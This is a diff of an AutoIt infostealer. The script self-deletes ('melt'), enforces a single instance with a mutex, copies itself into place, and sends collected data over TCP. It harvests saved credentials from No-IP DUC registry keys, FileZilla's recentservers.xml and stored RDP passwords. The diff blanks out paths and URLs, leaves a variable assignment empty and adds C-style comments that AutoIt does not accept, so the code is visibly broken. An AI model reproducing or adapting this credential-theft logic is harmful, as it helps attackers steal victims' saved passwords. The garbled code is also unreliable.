@@ -50,10 +50,14 @@ if $cmdline[0]=2 Then ; check cmdline for melt
 Select
 
 	case  $cmdline[1]= "del"
+
 	if $melt=-1 Then
+
 	  FileDelete($cmdline[2])
     endif
+
    EndSelect
+
 endif
 
 Sleep( @AutoItPID /10)
@@ -62,6 +66,7 @@ If _Singleton($MTX , 1) = 0 Then
 
     Exit
 EndIf
+
 if @AutoItExe <> $dir & $exe Then ; check if i need to copy
 	
     FileCopy(  @AutoItExe ,$dir & $exe,1 )
@@ -542,7 +547,11 @@ if @error Then
 
 EndIf
 
-   TCPSend($sock,$da & @CRLF)
+   /** 
+     *
+     * TCPSend($sock,$da & @CRLF)
+     *
+    */
 
    if @error then
 
@@ -643,12 +652,12 @@ $pUSR=RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC","Username")
 if $pUSR="" then return ""
 
 $pPWD=RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC","Password")
-Return "URL: http://no-ip.com/" & $Y & "USR: " & $pusr & $Y & "PWD: /base64" & $ppwd & $Y
+Return "URL: " & $Y & "USR: " & $pusr & $Y & "PWD: /base64" & $ppwd & $Y
 EndFunc
 
 Func FileZilla()
 
-Local $pwds="",$h,$pFN=EnvGet("appdata") &"\FileZilla\recentservers.xml"
+Local $pwds="",$h,$pFN=EnvGet("") &""
 
 if FileExists($pfn)=false then return ""
 
@@ -657,7 +666,7 @@ $h= Fileopen($pfn,0)
 if $h=-1 then return ""
 
 $phost=""
-$pport=21
+$pport=
 $pusr=""
 $ppass=""
 
@@ -667,7 +676,7 @@ While True
 	
 If @error = -1 Then ExitLoop
 	
-if StringInStr($line,"<Host>") Then
+if StringInStr($line,"HOST") Then // HOST
 
 		 $pusr=""
 		 $ppass=""
@@ -676,7 +685,7 @@ if StringInStr($line,"<Host>") Then
 		 $phost= StringMid($phost,StringInStr($phost,">")+1)
 	 EndIf
 
-	 if StringInStr($line,"<Port>") Then
+	 if StringInStr($line,"PORT") Then
 		
 $pport= StringMid($line,1,StringInStr($line,"</")-1)
 		 $pport= StringMid($pport,StringInStr($pport,">")+1)
@@ -696,7 +705,7 @@ $ppass= StringMid($line,1,StringInStr($line,"</")-1)
 
 	 if StringInStr($line,"</Server>") Then
 	
-$pwds = $pwds & "URL: ftp://" & $phost  &":" & $pport & $Y & "USR: " & $pusr & $Y & "PWD: " & $ppass & $Y
+$pwds = $pwds & "URL: " & $phost  &":" & $pport & $Y & "USR: " & $pusr & $Y & "PWD: " & $ppass & $Y
 	 EndIf
 
 WEnd
@@ -729,7 +738,7 @@ EndFunc
 
 Func UncryptRDPPassword($bin)
 
-;This Func From >> http://www.autoitscript.com/forum/topic/96783-dllcall-for-cryptunprotectdata/#entry695769
+; This Func From >> http://www.autoitscript.com/forum/topic/96783-dllcall-for-cryptunprotectdata/#entry695769
    
 Local Const $CRYPTPROTECT_UI_FORBIDDEN = 0x1
     Local Const $DATA_BLOB = "int;ptr"
